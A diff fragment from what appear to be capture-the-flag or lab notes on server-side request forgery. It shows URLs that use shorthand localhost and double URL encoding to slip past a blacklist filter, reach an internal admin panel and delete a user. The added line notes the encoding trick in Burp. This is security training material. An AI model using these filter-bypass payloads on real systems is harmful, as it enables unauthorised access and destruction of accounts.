@@ -17,7 +17,7 @@ The above is one way of bypassing blacklist-based input filter
 
 
 
-admin interface: http://127.1/%25%36%31dmin
+admin interface: http://127.1/%25%36%31dmin     Note: we need to use url encode full two times in burp to make it work
 delete carlos:  http://127.1/%25%36%31dmin/delete?username=carlos
 
 
